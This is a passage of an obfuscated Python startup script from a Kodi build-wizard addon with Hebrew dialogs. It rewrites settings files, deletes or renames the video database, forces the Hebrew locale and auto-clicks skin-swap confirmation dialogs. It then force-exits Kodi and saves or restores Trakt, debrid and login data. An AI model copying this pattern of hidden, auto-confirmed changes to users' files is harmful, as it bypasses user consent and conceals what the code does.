		OOOO00OOOO000O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:561
		try :#line:562
			O0O0O0000O0O0OO00 =open (OOOO00OOOO000O0OO ,'r')#line:563
			O0O000OO0OO00OOO0 =O0O0O0000O0O0OO00 .read ()#line:564
			O0O0O0000O0O0OO00 .close ()#line:565
			O0O00OO00OOO00O0O ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:566
			OO0OOOO0OO0O0OO0O =re .compile (O0O00OO00OOO00O0O ).findall (O0O000OO0OO00OOO0 )[0 ]#line:567
			O0O0O0000O0O0OO00 =open (OOOO00OOOO000O0OO ,'w')#line:568
			O0O0O0000O0O0OO00 .write (O0O000OO0OO00OOO0 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OO0OOOO0OO0O0OO0O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:569
			O0O0O0000O0O0OO00 .close ()#line:570
		except :#line:571
				pass #line:572
		swapSkins ('skin.Premium.mod')#line:573
	xbmcgui .Dialog ().ok ("Kodi Anonymous Fix",'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')#line:574
	os ._exit (1 )#line:575
def fix18update ():#line:576
	if KODIV >=18 :#line:577
		xbmc .sleep (4000 )#line:578
		if BUILDNAME =="":#line:579
			try :#line:580
				os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db"))#line:581
			except :#line:582
				pass #line:583
		try :#line:584
			OO000000O00OO0O0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:585
			OO000000O0OO00OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:586
			os .rename (OO000000O00OO0O0O ,OO000000O0OO00OO0 )#line:587
		except :#line:588
				pass #line:589
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:590
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:591
		fixfont ()#line:592
		OOO0OO0OOOOOO00OO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:593
		try :#line:594
			O000O00000O00O00O =open (OOO0OO0OOOOOO00OO ,'r')#line:595
			O000O0OO00OOOOOOO =O000O00000O00O00O .read ()#line:596
			O000O00000O00O00O .close ()#line:597
			O00OO0O0O0OO00OOO ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:598
			OOOO000O0O0OOO000 =re .compile (O00OO0O0O0OO00OOO ).findall (O000O0OO00OOOOOOO )[0 ]#line:599
			O000O00000O00O00O =open (OOO0OO0OOOOOO00OO ,'w')#line:600
			O000O00000O00O00O .write (O000O0OO00OOOOOOO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OOOO000O0O0OOO000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:601
			O000O00000O00O00O .close ()#line:602
		except :#line:603
				pass #line:604
		wiz .kodi17Fix ()#line:605
		OOO0OO0OOOOOO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:606
		try :#line:607
			O000O00000O00O00O =open (OOO0OO0OOOOOO00OO ,'r')#line:608
			O000O0OO00OOOOOOO =O000O00000O00O00O .read ()#line:609
			O000O00000O00O00O .close ()#line:610
			O00OO0O0O0OO00OOO ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:611
			OOOO000O0O0OOO000 =re .compile (O00OO0O0O0OO00OOO ).findall (O000O0OO00OOOOOOO )[0 ]#line:612
			O000O00000O00O00O =open (OOO0OO0OOOOOO00OO ,'w')#line:613
			O000O00000O00O00O .write (O000O0OO00OOOOOOO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OOOO000O0O0OOO000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:614
			O000O00000O00O00O .close ()#line:615
		except :#line:616
				pass #line:617
		swapSkins ('skin.Premium.mod')#line:618
	xbmcgui .Dialog ().ok ("Kodi Anonymous Fix",'גירסת הקודי אינה תואמת את גירסת הבילד, לתיקון הבעיה נא ללחוץ אישור. הקודי יסגר לאחר הפעולה.')#line:619
	os ._exit (1 )#line:620
def swapSkins (O000O00OOO0000OOO ,title ="Error"):#line:621
	O0OOO0OO0000OOO0O ='lookandfeel.skin'#line:622
	OO0OO0000O0O00O0O =O000O00OOO0000OOO #line:623
	O0OO0OO00000OO0OO =getOld (O0OOO0OO0000OOO0O )#line:624
	O0O0O0O00OO0O00OO =O0OOO0OO0000OOO0O #line:625
	setNew (O0O0O0O00OO0O00OO ,OO0OO0000O0O00O0O )#line:626
	O0O0O0OOOO0O0OOOO =0 #line:627
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O0OOOO0O0OOOO <100 :#line:628
		O0O0O0OOOO0O0OOOO +=1 #line:629
		xbmc .sleep (1 )#line:630
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:631
		xbmc .executebuiltin ('SendClick(11)')#line:632
	return True #line:633
def getOld (OO0O0OOOO0000OO00 ):#line:635
	try :#line:636
		OO0O0OOOO0000OO00 ='"%s"'%OO0O0OOOO0000OO00 #line:637
		O0OOOO0O000O0OOO0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OO0O0OOOO0000OO00 )#line:638
		O00O00OOO000OO0O0 =xbmc .executeJSONRPC (O0OOOO0O000O0OOO0 )#line:640
		O00O00OOO000OO0O0 =simplejson .loads (O00O00OOO000OO0O0 )#line:641
		if O00O00OOO000OO0O0 .has_key ('result'):#line:642
			if O00O00OOO000OO0O0 ['result'].has_key ('value'):#line:643
				return O00O00OOO000OO0O0 ['result']['value']#line:644
	except :#line:645
		pass #line:646
	return None #line:647
def setNew (OOOOO000OOOOOO000 ,OOOOOOO0OOOOO0O0O ):#line:650
	try :#line:651
		OOOOO000OOOOOO000 ='"%s"'%OOOOO000OOOOOO000 #line:652
		OOOOOOO0OOOOO0O0O ='"%s"'%OOOOOOO0OOOOO0O0O #line:653
		OOO00O000OOO0OOOO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOOOO000OOOOOO000 ,OOOOOOO0OOOOO0O0O )#line:654
		O0O00O000OOOO0000 =xbmc .executeJSONRPC (OOO00O000OOO0OOOO )#line:656
	except :#line:657
		pass #line:658
	return None #line:659
def idle ():#line:660
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:661
def fixfont ():#line:662
	OO0O0OO0O0OO0O000 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:663
	OOOOO000OO00O00OO =json .loads (OO0O0OO0O0OO0O000 );#line:665
	O0OO0OO000OO0OO0O =OOOOO000OO00O00OO ["result"]["settings"]#line:666
	OOO0OOO00O000OOO0 =[O0O00O000O00O0OOO for O0O00O000O00O0OOO in O0OO0OO000OO0OO0O if O0O00O000O00O0OOO ["id"]=="audiooutput.audiodevice"][0 ]#line:668
	O00O000O000000O0O =OOO0OOO00O000OOO0 ["options"];#line:669
	O000OOO00OO0000OO =OOO0OOO00O000OOO0 ["value"];#line:670
	O000O0O0OOOOO0OOO =[O000OO0OO0OOO0O0O for (O000OO0OO0OOO0O0O ,O0O00O00OO0O0O0O0 )in enumerate (O00O000O000000O0O )if O0O00O00OO0O0O0O0 ["value"]==O000OOO00OO0000OO ][0 ];#line:672
	OOO00O000OOO00OO0 =(O000O0O0OOOOO0OOO +1 )%len (O00O000O000000O0O )#line:674
	O00OO0O0O0O0OOO00 =O00O000O000000O0O [OOO00O000OOO00OO0 ]["value"]#line:676
	OO000O0OO0OOO00O0 =O00O000O000000O0O [OOO00O000OOO00OO0 ]["label"]#line:677
	OOOOOOO0O0OOO0OO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:679
	try :#line:681
		OOO0OOO00O0O00000 =json .loads (OOOOOOO0O0OOO0OO0 );#line:682
		if OOO0OOO00O0O00000 ["result"]!=True :#line:684
			raise Exception #line:685
	except :#line:686
		sys .stderr .write ("Error switching audio output device")#line:687
		raise Exception #line:688
def checkSkin ():#line:691
	wiz .log ("[Build Check] Invalid Skin Check Start")#line:692
	O000O0OO0OO0000O0 =wiz .getS ('defaultskin')#line:693
	OOOO0OOOOOO0O0OO0 =wiz .getS ('defaultskinname')#line:694
	O00OO0O0OOOOOOOOO =wiz .getS ('defaultskinignore')#line:695
	O0000000O0O000000 =False #line:696
	if not O000O0OO0OO0000O0 =='':#line:697
		if os .path .exists (os .path .join (ADDONS ,O000O0OO0OO0000O0 )):#line:698
			if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,SKIN [5 :].title ()),"Would you like to set the skin back to:[/COLOR]",'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO0OOOOOO0O0OO0 )):#line:699
				O0000000O0O000000 =O000O0OO0OO0000O0 #line:700
				O00O0OO00OOOOOOOO =OOOO0OOOOOO0O0OO0 #line:701
			else :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true');O0000000O0O000000 =False #line:702
		else :wiz .setS ('defaultskin','');wiz .setS ('defaultskinname','');O000O0OO0OO0000O0 ='';OOOO0OOOOOO0O0OO0 =''#line:703
	if O000O0OO0OO0000O0 =='':#line:704
		O0O000O00OOOO0OO0 =[]#line:705
		OOOO0O0OOOO0OO000 =[]#line:706
		for OOOOO00OO000O0000 in glob .glob (os .path .join (ADDONS ,'skin.*/')):#line:707
			O00O000O00OOOOOOO ="%s/addon.xml"%OOOOO00OO000O0000 #line:708
			if os .path .exists (O00O000O00OOOOOOO ):#line:709
				OO0O000OO000O0OO0 =open (O00O000O00OOOOOOO ,mode ='r');O00O0O00O0OO0000O =OO0O000OO000O0OO0 .read ().replace ('\n','').replace ('\r','').replace ('\t','');OO0O000OO000O0OO0 .close ();#line:710
				O000000OOO00O00O0 =wiz .parseDOM (O00O0O00O0OO0000O ,'addon',ret ='id')#line:711
				O0O0OO0O0OO0OO0OO =wiz .parseDOM (O00O0O00O0OO0000O ,'addon',ret ='name')#line:712
				wiz .log ("%s: %s"%(OOOOO00OO000O0000 ,str (O000000OOO00O00O0 [0 ])),xbmc .LOGNOTICE )#line:713
				if len (O000000OOO00O00O0 )>0 :OOOO0O0OOOO0OO000 .append (str (O000000OOO00O00O0 [0 ]));O0O000O00OOOO0OO0 .append (str (O0O0OO0O0OO0OO0OO [0 ]))#line:714
				else :wiz .log ("ID not found for %s"%OOOOO00OO000O0000 ,xbmc .LOGNOTICE )#line:715
			else :wiz .log ("ID not found for %s"%OOOOO00OO000O0000 ,xbmc .LOGNOTICE )#line:716
		if len (OOOO0O0OOOO0OO000 )>0 :#line:717
			if len (OOOO0O0OOOO0OO000 )>1 :#line:718
				if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems that the skin has been set back to [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,SKIN [5 :].title ()),"Would you like to view a list of avaliable skins?[/COLOR]"):#line:719
					O00000OO00OO0O0O0 =DIALOG .select ("Select skin to switch to!",O0O000O00OOOO0OO0 )#line:720
					if O00000OO00OO0O0O0 ==-1 :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true')#line:721
					else :#line:722
						O0000000O0O000000 =OOOO0O0OOOO0OO000 [O00000OO00OO0O0O0 ]#line:723
						O00O0OO00OOOOOOOO =O0O000O00OOOO0OO0 [O00000OO00OO0O0O0 ]#line:724
				else :wiz .log ("Skin was not reset",xbmc .LOGNOTICE );wiz .setS ('defaultskinignore','true')#line:725
	if O0000000O0O000000 :#line:732
		skinSwitch .swapSkins (O0000000O0O000000 )#line:733
		OO0000OO0O0000O00 =0 #line:734
		xbmc .sleep (1000 )#line:735
		while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0000OO0O0000O00 <150 :#line:736
			OO0000OO0O0000O00 +=1 #line:737
			xbmc .sleep (200 )#line:738
		if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:740
			wiz .ebi ('SendClick(11)')#line:741
			wiz .lookandFeelData ('restore')#line:742
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Skin Swap Timed Out![/COLOR]'%COLOR2 )#line:743
	wiz .log ("[Build Check] Invalid Skin Check End",xbmc .LOGNOTICE )#line:744
while xbmc .Player ().isPlayingVideo ():#line:746
	xbmc .sleep (1000 )#line:747
if KODIV >=17 :#line:749
	NOW =datetime .now ()#line:750
	temp =wiz .getS ('kodi17iscrap')#line:751
	if not temp =='':#line:752
		if temp >str (NOW -timedelta (minutes =2 )):#line:753
			wiz .log ("Killing Start Up Script")#line:754
			sys .exit ()#line:755
	wiz .log ("%s"%(NOW ))#line:756
	wiz .setS ('kodi17iscrap',str (NOW ))#line:757
	xbmc .sleep (1000 )#line:758
	if not wiz .getS ('kodi17iscrap')==str (NOW ):#line:759
		wiz .log ("Killing Start Up Script")#line:760
		sys .exit ()#line:761
	else :#line:762
		wiz .log ("Continuing Start Up Script")#line:763
wiz .log ("[Path Check] Started",xbmc .LOGNOTICE )#line:765
path =os .path .split (ADDONPATH )#line:766
if not ADDONID ==path [1 ]:DIALOG .ok (ADDONTITLE ,'[COLOR %s]Please make sure that the plugin folder is the same as the ADDON_ID.[/COLOR]'%COLOR2 ,'[COLOR %s]Plugin ID:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,ADDONID ),'[COLOR %s]Plugin Folder:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,path ));wiz .log ("[Path Check] ADDON_ID and plugin folder doesnt match. %s / %s "%(ADDONID ,path ))#line:767
else :wiz .log ("[Path Check] Good!",xbmc .LOGNOTICE )#line:768
if KODIADDONS in ADDONPATH :#line:771
	wiz .log ("Copying path to addons dir",xbmc .LOGNOTICE )#line:772
	if not os .path .exists (ADDONS ):os .makedirs (ADDONS )#line:773
	newpath =xbmc .translatePath (os .path .join ('special://home/addons/',ADDONID ))#line:774
	if os .path .exists (newpath ):#line:775
		wiz .log ("Folder already exists, cleaning House",xbmc .LOGNOTICE )#line:776
		wiz .cleanHouse (newpath )#line:777
		wiz .removeFolder (newpath )#line:778
	try :#line:779
		wiz .copytree (ADDONPATH ,newpath )#line:780
	except Exception as e :#line:781
		pass #line:782
	wiz .forceUpdate (True )#line:783
try :#line:785
	mybuilds =xbmc .translatePath (MYBUILDS )#line:786
	if not os .path .exists (mybuilds ):xbmcvfs .mkdirs (mybuilds )#line:787
except :#line:788
	pass #line:789
wiz .log ("[Installed Check] Started",xbmc .LOGNOTICE )#line:791
if KODIV >=17 and SKIN in ['skin.confluence','skin.estuary']and not BUILDNAME =="":#line:795
			wiz .kodi17Fix ()#line:796
			fix18update ()#line:797
			fix17update ()#line:798
if INSTALLED =='true':#line:801
    input =(ADDON .getSetting ("rdbuild"))#line:802
    if KEEPTRAKT =='true':traktit .traktIt ('restore','all');wiz .log ('[Installed Check] Restoring Trakt Data',xbmc .LOGNOTICE )#line:804
    if KEEPREAL =='true':debridit .debridIt ('restore','all');wiz .log ('[Installed Check] Restoring Real Debrid Data',xbmc .LOGNOTICE )#line:805
    if input =='true':loginit .loginIt ('restore','all');wiz .log ('[Installed Check] Restoring Login Data',xbmc .LOGNOTICE )#line:806
    wiz .clearS ('install')#line:807
wiz .log ("[Notifications] Started",xbmc .LOGNOTICE )#line:892
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:894
	input =(ADDON .getSetting ("autoupdate"))#line:895
	STARTP2 ()#line:896
	if not NOTIFY =='true':#line:897
		url =wiz .workingURL (NOTIFICATION )#line:898
		if url ==True :#line:899
			id ,msg =wiz .splitNotify (NOTIFICATION )#line:900
			if not id ==False :#line:901
				try :#line:902
					id =int (id );NOTEID =int (NOTEID )#line:903
					if id ==NOTEID :#line:904
						if NOTEDISMISS =='false':#line:905
							debridit .debridIt ('update','all')#line:906
							traktit .traktIt ('update','all')#line:907
							checkidupdate ()#line:908
						else :wiz .log ("[Notifications] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:909
					elif id >NOTEID :#line:910
						wiz .log ("[Notifications] id: %s"%str (id ),xbmc .LOGNOTICE )#line:911
						wiz .setS ('noteid',str (id ))#line:912
						wiz .setS ('notedismiss','false')#line:913
						if input =='true':#line:914
							debridit .debridIt ('update','all')#line:915
							traktit .traktIt ('update','all')#line:916
							checkidupdate ()#line:917
						else :notify .notification (msg =msg )#line:918
						wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:919
				except Exception as e :#line:920
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:921
			else :wiz .log ("[Notifications] Text File not formated Correctly")#line:922
		else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,url ),xbmc .LOGNOTICE )#line:923
	else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:924
else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:925
wiz .log ("[Notifications2] Started",xbmc .LOGNOTICE )#line:927
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium 18":#line:928
	if not NOTIFY2 =='true':#line:929
		url =wiz .workingURL (NOTIFICATION2 )#line:930
		if url ==True :#line:931
			id ,msg =wiz .splitNotify (NOTIFICATION2 )#line:932
			if not id ==False :#line:933
				try :#line:934
					id =int (id );NOTEID2 =int (NOTEID2 )#line:935
					if id ==NOTEID2 :#line:936
						if NOTEDISMISS2 =='false':#line:937
							notify .notification2 (msg )#line:938
						else :wiz .log ("[Notifications2] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:939
					elif id >NOTEID2 :#line:940
						wiz .log ("[Notifications2] id: %s"%str (id ),xbmc .LOGNOTICE )#line:941
						wiz .setS ('noteid2',str (id ))#line:942
						wiz .setS ('notedismiss2','false')#line:943
						notify .notification2 (msg =msg )#line:944
						wiz .log ("[Notifications2] Complete",xbmc .LOGNOTICE )#line:945
				except Exception as e :#line:946
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:947
			else :wiz .log ("[Notifications2] Text File not formated Correctly")#line:948
		else :wiz .log ("[Notifications2] URL(%s): %s"%(NOTIFICATION2 ,url ),xbmc .LOGNOTICE )#line:949
	else :wiz .log ("[Notifications2] Turned Off",xbmc .LOGNOTICE )#line:950
else :wiz .log ("[Notifications2] Not Enabled",xbmc .LOGNOTICE )#line:951
wiz .log ("[Notifications3] Started",xbmc .LOGNOTICE )#line:953
if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium 18"or BUILDNAME ==" Kodi Premium":#line:954
	if not NOTIFY3 =='true':#line:955
		url =wiz .workingURL (NOTIFICATION3 )#line:956
		if url ==True :#line:957
			id ,msg =wiz .splitNotify (NOTIFICATION3 )#line:958
			if not id ==False :#line:959
				try :#line:960
					id =int (id );NOTEID3 =int (NOTEID3 )#line:961
					if id ==NOTEID3 :#line:962
						if NOTEDISMISS3 =='false':#line:963
							notify .notification3 (msg )#line:964
						else :wiz .log ("[Notifications3] id[%s] Dismissed"%int (id ),xbmc .LOGNOTICE )#line:965
					elif id >NOTEID3 :#line:966
						wiz .log ("[Notifications3] id: %s"%str (id ),xbmc .LOGNOTICE )#line:967
						wiz .setS ('noteid3',str (id ))#line:968
						wiz .setS ('notedismiss3','false')#line:969
						notify .notification3 (msg =msg )#line:970
						wiz .log ("[Notifications3] Complete",xbmc .LOGNOTICE )#line:971
				except Exception as e :#line:972
					wiz .log ("Error on Notifications Window: %s"%str (e ),xbmc .LOGERROR )#line:973
			else :wiz .log ("[Notifications3] Text File not formated Correctly")#line:974
		else :wiz .log ("[Notifications3] URL(%s): %s"%(NOTIFICATION3 ,url ),xbmc .LOGNOTICE )#line:975
	else :wiz .log ("[Notifications3] Turned Off",xbmc .LOGNOTICE )#line:976
else :wiz .log ("[Notifications3] Not Enabled",xbmc .LOGNOTICE )#line:977
wiz .log ("[Trakt Data] Started",xbmc .LOGNOTICE )#line:978
if KEEPTRAKT =='true':#line:979
	if TRAKTSAVE <=str (TODAY ):#line:980
		wiz .log ("[Trakt Data] Saving all Data",xbmc .LOGNOTICE )#line:981
		traktit .autoUpdate ('all')#line:982
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:983
	else :#line:984
		wiz .log ("[Trakt Data] Next Auto Save isnt until: %s / TODAY is: %s"%(TRAKTSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:985
else :wiz .log ("[Trakt Data] Not Enabled",xbmc .LOGNOTICE )#line:986
wiz .log ("[Real Debrid Data] Started",xbmc .LOGNOTICE )#line:988
if KEEPREAL =='true':#line:989
	if REALSAVE <=str (TODAY ):#line:990
		wiz .log ("[Real Debrid Data] Saving all Data",xbmc .LOGNOTICE )#line:991
		debridit .autoUpdate ('all')#line:992
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:993
	else :#line:994
		wiz .log ("[Real Debrid Data] Next Auto Save isnt until: %s / TODAY is: %s"%(REALSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:995
else :wiz .log ("[Real Debrid Data] Not Enabled",xbmc .LOGNOTICE )#line:996
wiz .log ("[Login Data] Started",xbmc .LOGNOTICE )#line:998
if KEEPLOGIN =='true':#line:999
	if LOGINSAVE <=str (TODAY ):#line:1000
		wiz .log ("[Login Data] Saving all Data",xbmc .LOGNOTICE )#line:1001
		loginit .autoUpdate ('all')#line:1002
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:1003
	else :#line:1004
		wiz .log ("[Login Data] Next Auto Save isnt until: %s / TODAY is: %s"%(LOGINSAVE ,str (TODAY )),xbmc .LOGNOTICE )#line:1005
else :wiz .log ("[Login Data] Not Enabled",xbmc .LOGNOTICE )#line:1006
wiz .log ("[Auto Clean Up] Started",xbmc .LOGNOTICE )#line:1008
if AUTOCLEANUP =='true':#line:1009
	service =False #line:1010
	days =[TODAY ,TOMORROW ,THREEDAYS ,ONEWEEK ]#line:1011
	feq =int (float (AUTOFEQ ))#line:1012
	if AUTONEXTRUN <=str (TODAY )or feq ==0 :#line:1013
		service =True #line:1014
		next_run =days [feq ]#line:1015
		wiz .setS ('nextautocleanup',str (next_run ))#line:1016
	else :wiz .log ("[Auto Clean Up] Next Clean Up %s"%AUTONEXTRUN ,xbmc .LOGNOTICE )#line:1017
	if service ==True :#line:1018
		AUTOCACHE =wiz .getS ('clearcache')#line:1019
		AUTOPACKAGES =wiz .getS ('clearpackages')#line:1020
		AUTOTHUMBS =wiz .getS ('clearthumbs')#line:1021
		if AUTOCACHE =='true':wiz .log ('[Auto Clean Up] Cache: On',xbmc .LOGNOTICE );wiz .clearCache (True )#line:1022
		else :wiz .log ('[Auto Clean Up] Cache: Off',xbmc .LOGNOTICE )#line:1023
		if AUTOTHUMBS =='true':wiz .log ('[Auto Clean Up] Old Thumbs: On',xbmc .LOGNOTICE );wiz .oldThumbs ()#line:1024
		else :wiz .log ('[Auto Clean Up] Old Thumbs: Off',xbmc .LOGNOTICE )#line:1025
		if AUTOPACKAGES =='true':wiz .log ('[Auto Clean Up] Packages: On',xbmc .LOGNOTICE );wiz .clearPackagesStartup ()#line:1026
		else :wiz .log ('[Auto Clean Up] Packages: Off',xbmc .LOGNOTICE )#line:1027
else :wiz .log ('[Auto Clean Up] Turned off',xbmc .LOGNOTICE )#line:1028
wiz .setS ('kodi17iscrap','')#line:1030
for dirpath ,dirnames ,filenames in os .walk (packagesdir ):#line:1099
	count =0 #line:1100
	for f in filenames :#line:1101
		count +=1 #line:1102
		fp =os .path .join (dirpath ,f )#line:1103
		total_size +=os .path .getsize (fp )#line:1104
total_sizetext ="%.0f"%(total_size /1024000.0 )#line:1105
for dirpath2 ,dirnames2 ,filenames2 in os .walk (thumbnails ):#line:1112
	for f2 in filenames2 :#line:1113
		fp2 =os .path .join (dirpath2 ,f2 )#line:1114
		total_size2 +=os .path .getsize (fp2 )#line:1115
total_sizetext2 ="%.0f"%(total_size2 /1024000.0 )#line:1116
if int (total_sizetext2 )>filesize_thumb :#line:1118
	choice2 =xbmcgui .Dialog ().yesno ("[COLOR=red]קודי אנונימוס - ניקוי תמונות פוסטרים ישנות[/COLOR]",'[COLOR red]'+str (total_sizetext2 )+' MB  :גודל התיקיה היא [/COLOR]','מומלץ למחוק את התיקיה בשביל לפנות מקום נוסף במכשיר','האם ברצונך למחוק אותה עכשיו?',yeslabel ='כן',nolabel ='לא')#line:1119
	if choice2 ==1 :#line:1120
		maintenance .deleteThumbnails ()#line:1121
total_sizetext ="%.0f"%(total_size /1024000.0 )#line:1123
total_sizetext2 ="%.0f"%(total_size2 /1024000.0 )#line:1124
if notify_mode =='true':xbmc .executebuiltin ('XBMC.Notification(%s, %s, %s, %s)'%('Maintenance Status','Packages: '+str (total_sizetext )+' MB' ' - Images: '+str (total_sizetext2 )+' MB','5000',iconpath ))#line:1126
time .sleep (3 )#line:1127
